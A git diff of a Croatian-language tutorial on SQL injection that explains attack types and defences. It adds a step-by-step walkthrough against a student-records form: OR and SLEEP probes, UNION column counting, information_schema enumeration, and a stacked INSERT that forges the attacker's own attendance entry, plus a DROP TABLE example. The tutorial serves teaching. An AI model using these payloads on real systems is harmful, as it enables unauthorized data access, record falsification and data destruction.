@@ -4,35 +4,145 @@ title: SQL injekcija
 
 # SQL Injekcija
 
-## Osnovno o temi
+## Teorijski uvod
 
-SQL injekcija je jedan od najopasnijih i najčešćih sigurnosnih rizika u web aplikacijama. Radi se o napadu u kojem napadač može koristiti polja za korisnički unos, poput formi, za unos zlonamjernog SQL koda koji će se izvršiti na bazi podataka.
+SQL injekcija je tehnika ubacivanja SQL koda u polja za korisnički unos, s ciljem dobivanja neovlaštenog pristupa informacijama ili uništavanja baze podataka. SQL injekcija moguća je samo kod upita koji uzimaju korisnički unos i rade SQL upit dinamički, bez provjere samog unosa. Ukoliko je aplikacija ranjiva, korisnik može kontrolirati što se izvršava na bazi podataka. Napad SQL injekcijom sastoji se od ubacivanja ili injekcije djelomičnog ili cijelog SQL upita pomoću polja za korisnički unos. Uspješan napad može rezultirati čitanjem osjetljivih informacija pohranjenih u bazi podataka,  modificiranjem podataka pomoću naredbi poput INSERT, UPDATE i DELETE, gašenje baze podataka, pronalaženjem i preuzimanjem datoteka iz datotečnog sustava baze podataka i u nekim slučajevima, izvršavanje naredbi na operacijskom sustavu.
 
-Ako imamo neku formu za pretraživanje svih studenata s nekim imenom, tipičan SQL upit koji se izvršava na bazi podataka izgledao bi ovako:
+**Napadi se mogu podijeliti u 3 kategorije:**
 
-```sql showLineNumbers=false
-SELECT * FROM student WHERE ime = 'Karlo';
-```
+- **Napad unutar kanala** - Podaci se izvlače korišteći isti komunikacijski kanal koji se koristi za ubacivanje SQL koda. Ovo je najizravnija vrsta napada, u kojoj se dohvaćeni podaci prikazuju izravno na web stranici aplikacije (ova vrsta napada je pokazana na primjeru)
+- **Napad izvan kanala** - Podaci se dohvaćaju koristeći drugačiji kanal (npr. slanje e-maila s rezultatima upita napadaču)
+- **Slijep napad** - Nema stvarnog prijenosa podataka iz baze podataka prema napadaču. Umjesto toga, napadač može rekonstruirati informacije slanjem određenih upita i promatranjem ponašanja DBMS-a, kao što su kašnjenja u odgovoru ili različiti odgovori aplikacije ovisno o tome je li upit istinit ili lažan.
 
-Ukoliko web aplikacija gradi upite dinamički, primjerice spajanjem stringova, i pri tome ne koristi odgovarajuće provjere, napadač može u polje za pretraživanje napisati na primjer `'Karlo'; DROP TABLE student; --`. Upit postaje:
+**Najčešće tehnike za iskorištavanje pronađenih ranjivosti, koje mogu biti korištene zasebno ili kombiniranjem više tehnika od jednom:**
 
-```sql showLineNumbers=false
-SELECT * FROM student WHERE ime = 'Karlo'; DROP TABLE student; --';
-```
+- **UNION operator** - Može se koristiti kada se ranjivost dogodi u SELECT naredbi, omogućujući kombiniranje dva upita u jedan rezultat.
+- **Logička metoda** - Koristi logičke uvjete kako bi se provjerilo jesu li određeni uvjeti istiniti ili lažni, na temelju proučavanja HTTP odgovora.
+- **Namjerno izazivanje greške** - Tehnika prisiljavanja baze podataka da generira grešku, kako bi napadač na temelju tih informacija mogao poboljšati svoj zlonamjerni upit. Namjernim izazivanjem greške napadači mogu dobiti informacije o bazi podataka i njenoj strukturi.
+- **Vremenska odgoda** - Koristi naredbe poput SLEEP za odgađanje odgovora u uvjetnim upitima. Korisno kada se ne dobiva nikakav odgovor, jer proučavanjem vremena potrebnog za odgovor napadač može saznati je li upit istinit ili lažan.
 
-Da bi ovaj upit stvarno rezultirao brisanjem cijele tablice studenata, mnogo stvari se mora savršteno posložiti. Korisnički račun morao bi imati `DROP` privilegije, baza podataka mora podržavati izvršavanje više naredbi u jednom pozivu, primarni ključ tablice ne smije biti vanjski ključ na druge tablice s `ON DELETE RESTRICT` ograničenjem i tako dalje. Međutim, čak i kad brisanje tablice nije moguće, SQL injection i dalje predstavlja ozbiljan sigurnosni rizik. Napadači mogu pristupiti osjetljivim podacima kao što su OIB-ovi, zaobići autentifikaciju i dobiti admistratorske privilegije ili modificirati postojeće podatke.
 
-Neke velike kompanije koje su bile žrtve SQL injection napada:
+**Neke velike kompanije koje su bile žrtve SQL injection napada:**
 
   - **Sony Pictures**: 2011 godine SQL injection napad rezultirao je krađom otprilike 77 milijuna PlayStation Network računa, ukupne štete oko 170 milijuna dolara
   - **Yahoo!**: Tvrtka je bila žrtva više napada između 2013 i 2016 godine, pri čemu je u najvećem napadu ukradeno preko pola milijuna email adresa i lozinka. Sveukupna šteta svih napada bila je preko 3 milijarde korisničkih računa.
   - **JPMorgan Chase**: JPMorgan Chase je jedna on nejvećih banka u Sjedinjenim Američkim državama. 2014 godine objavili su da su računi od preko 76 milijuna kućanstva kompromizirani. Ukradeni podaci uključuju imena, brojeve mobitle i email adrese korisnika, ali ne podatke vezane uz njihove financije.
 
- ## Što omogućuje SQL injekciju?
+**Kako spriječiti napad SQL injekcijom?**
 
- Ukratko, loša arhitektura aplikacije. Polja za unos ne validiraju korisnički unos, aplikacija dinamički kreira SQL upite (povezivanje stringova), ne korištenje pripremljenih upita i tako dalje.
+- **Korištenje pripremljenih upita** - pripremljeni upiti omogućuju da se korisnički unos tretira isključivo kao podatak, a ne kao dio SQL naredbe, čime se sprječava manipulacija strukturom upita. Ovo je najučinkovitija i najčešće preporučena metoda zaštite od SQL injekcije.
+- **Validacija i filtriranje korisničkih unosa** - Ulazni podaci moraju se provjeravati na ispravnost tipa, formata i dužine. Primjerice, ako se očekuje unos JMBAG-a, potrebno je provjeriti da li je unos u ispravnom formatu (samo znamenke od 0 do 9, točno 10 znamenka).
+- **Princip najmanjih privilegija** - Korisnički računi baze podataka kojima pristupa aplikacija trebaju imati samo minimalne potrebne dozvole. Time se ograničava potencijalna šteta u slučaju uspješnog napada.
+- **Sakrivanje i maskiranje poruka o greškama** - Poruke o greškama koje baza podataka vraća ne bi trebale otkrivati detalje o strukturi baze podataka ili upitima, jer takve informacije mogu pomoći napadaču.
 
- Primjer upita s dinamičkim generiranjem SQL-a (**loše**):
+
+## Osnovni primjer SQL injekcije
+
+Zamislimo da imamo tablicu studenata s poljima `jmbag`, `ime` i `prezime`. U aplikaciji postoji forma za pretraživanje studenata po imenu. Upit koji se koristi za dohvat studenta može izgledati ovako:
+
+```sql showLineNumbers=false
+SELECT * FROM student WHERE ime = 'Karlo';
+```
+
+Ukoliko web aplikacija gradi upite dinamički, spajanjem stringova i pri tome ne koristi odgovarajuće provjere, napadač u polje za pretraživanje imena može napisati na primjer `Karlo'; DROP TABLE student; --`. Upit onda postaje:
+
+```sql showLineNumbers=false
+SELECT * FROM student WHERE ime = 'Karlo'; DROP TABLE student; --';
+```
+
+Da bi ovaj upit stvarno rezultirao brisanjem cijele tablice studenata, mnogo stvari se mora savršeno posložiti. Korisnički račun morao bi imati `DROP` privilegije, baza podataka mora podržavati izvršavanje više naredbi u jednom pozivu, primarni ključ tablice student ne smije biti vanjski ključ na druge tablice s `ON DELETE RESTRICT` ograničenjem i tako dalje. Međutim, čak i kad brisanje tablice nije moguće, SQL injekcija i dalje predstavlja ozbiljan sigurnosni rizik. Napadači mogu pristupiti osjetljivim podacima, zaobići autentifikaciju ili modificirati postojeće podatke.
+
+## Praktičan primjer - dodavanje prisutnosti
+
+### Provjera ranjivosti
+
+Pretpostavimo da smo student i imamo pristup nekakvoj formi za pretraživanje podataka pomoću JMBAG-a. Prvo što moramo provjeriti je ranjivost forme na SQL injekciju. Najčešći testovi za to su korištenje OR uvjeta ili funkcije za zaustavljanje izvršavanja na ordređeni broj sekundi (SLEEP()).
+
+Testirati ranjivost možemo na sljedeće načine:
+
+- Korištenjem `OR` uvjeta - `' OR '1'='1 #`, rezultat bi trebao biti jedan ili više studenata (**Oprez:** mnogo aplikacija koristi jedan odgovor za izvršavanje više od jednog upita. Ukoliko jedan od njih sadrži DELETE ili DROP naredbu, može doći do brisanja tablice ili baze podataka)
+- Korištenjem funckije za odgodu izvršavanja upita - `0246801234' AND SLEEP(3) #`, rezultat bi trebao biti odgovor nakon 3 sekunde
+
+
+### Broj stupaca u tablici
+
+Sad moramo saznati koliko stupaca ima tablica, da bi kasnije mogli koristiti UNION operator za kombiniranje rezultata našeg upita i upita koji se obično šalje bazi podataka. Testiranje radimo tako da probamo samo sa jednim stupcem, zatim s dva i tako dalje.
+
+- `' UNION SELECT 1 #` - greška
+- `' UNION SELECT 1, 2 #` - greška
+- ...
+
+```text showLineNumbers=false
+' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9 #
+```
+
+### Imena svih tablica
+Sljedeći korak je otkriti koje sve tablice postoje u bazi podataka i pronaći strukturu tablice u kojoj se bilježi prisutnost. U formu unosimo:
+
+```text showLineNumbers=false
+' UNION SELECT table_name, table_schema, 'a', 'b', 'c', 'd', 2025, 'e', 1
+FROM information_schema.tables
+WHERE table_schema = database() #
+```
+
+- `information_schema` - posebna baza podataka u MySQL-u koja sadrži podatke o svim drugim bazama podataka
+    - `tables` - tablica s informacijama o svim drugim tablicama
+        - `table_name` - stupac koji sadrži sva imena tablica
+        - `table_schema` - stupac koji sadrži naziv baze podataka
+- `database()` - funkcija koja vraća naziv trenutno aktivne baze podataka
+- U stupce koji nam ne trebaju unosimo nasumične podatke da bi broj stupaca u oba upita ostao isti
+
+### Strukture određenih tablica
+
+Sad znamo da postoji tablica za `prisutnost` i možemo provjeriti koje stupce sadrži. `information_schema` također sadrži i tablicu `columns` u kojoj se nalaze imena svih stupaca i njihovih tipova.
+
+```text showLineNumbers=false
+' UNION SELECT column_name, data_type, 'a', 'b', 'c', 'd', 2025, 'e', 1
+FROM information_schema.columns
+WHERE table_name = 'prisutnost' AND table_schema = database() #
+```
+
+Sad vidimo da za unos prisutnosti moramo znati točan `stud_predmet` koji se odnosi na nas. Moramo pronaći iz koje tablice dolazi `stud_predmet`. Možemo pretpostaviti da je `stud_predmet` vanjski ključ na tablicu `student_predmet`, pa pogledamo njenu strukturu (u prošlom unosu samo zamijenimo vrijednost table_name).
+
+```text showLineNumbers=false
+' UNION SELECT column_name, data_type, 'a', 'b', 'c', 'd', 2025, 'e', 1
+FROM information_schema.columns
+WHERE table_name = 'student_predmet' AND table_schema = database() #
+```
+
+### Dobivanje podataka iz drugih tablica
+
+Sad možemo nastaviti na nekoliko načina. Prvi je da pogledamo strukturu tablica `predmet` (pretpostavimo da `predmet_id` dolazi iz te tablice) i zatim pretražimo tablicu `student_predmet` s našim JMBAG-om i odgovarajućim predmetom da nađemo id koji nam treba za evidenciju. Drugi je da pogledamo sve retke iz tablice `student_predmet` i nađemo retke s našim JMBAG-om. S tim informacijama možemo pogledati u tablicu `prisutnost` i vidjeti po datumima predavanja na koji se predmet odnosi koji id (usporedimo s rasporedom). Drugi način je brži pa koristimo taj.
+
+Dobivanje svih retka s našim JMBAG-om iz tablice `student_predmet`:
+
+```text showLineNumbers=false
+' UNION SELECT id, 'f', 'a', 'b', 'c', 'd', 2025, 'e', 1
+FROM student_predmet
+WHERE jmbag = '0246801235' #
+```
+
+Pregled prisutnosti samo s pronađenim `stud_predmet`:
+
+```text showLineNumbers=false
+' UNION SELECT stud_predmet, datum, 'a', 'b', 'c', 'd', 2025, 'e', 1
+FROM prisutnost
+WHERE stud_predmet = 3 OR stud_predmet = 4 #
+```
+
+Zaključimo da predavanje je točna vrijednost za stud_predmet 3 i na temelju toga možemo dodati novu prisutnost.
+
+### Dodavanje novog retka u tablicu prisutnost
+
+**Napomena:** Posljednji upit sadrži više od jedne naredbe (SELECT i INSERT). Izvršavanje više od jedne naredbe u istom upitu u MySQL-u moguće je samo ako je omogućena opcija `allowMultipleStatements`. Zbog sigurnosnih razloga (upravo ovih demonstriranih), ta mogućnost ne može biti omogućena na [aiven.io](https://aiven.io).
+
+```text showLineNumbers=false
+'; INSERT INTO prisutnost (stud_predmet, datum) VALUES (3, '2025-06-06'); #
+```
+
+## Primjeri POST zahtjeva
+
+### Primjer ranjivog koda
 
 ```js title="upit.js" {"1. const jmbag simulira korisnički unos (npr. forma)":3-5} collapse={10-21, 23-28}
 const POST = async ({ request }) => {
@@ -66,20 +176,6 @@ const POST = async ({ request }) => {
   }
 }
 ```
-
-Rezultat ovog upita bio bi:
-
-- **Jmbag**: 0246801234
-- **Ime**: Marko
-- **Prezime**: Marković
-- **OIB**: 12345678901
-- **Email**: marko.markovic@student.hr
-- **Mobitel**: +385912345678
-- **Godina upisa**: 2023
-- **Status**: redovan
-- **Smjer**: 1
-
-Budući da se upit gradi povezivanjem stringova i pri tome se ne radi nikakva provjera unosa, ukoliko u polje za unos napišemo SQL kod, taj kod bi se poslao i izvršio na bazi podataka bez ikakvih pogrešaka. Ako u primjeru gore umjesto `const jmbag = "0246801234"` napišemo `const jmbag = "' OR '1'='1"`, kao rezultat dobili bi sve retke iz tablice `student`.
 
 ### Kako popraviti ovaj primjer?
 
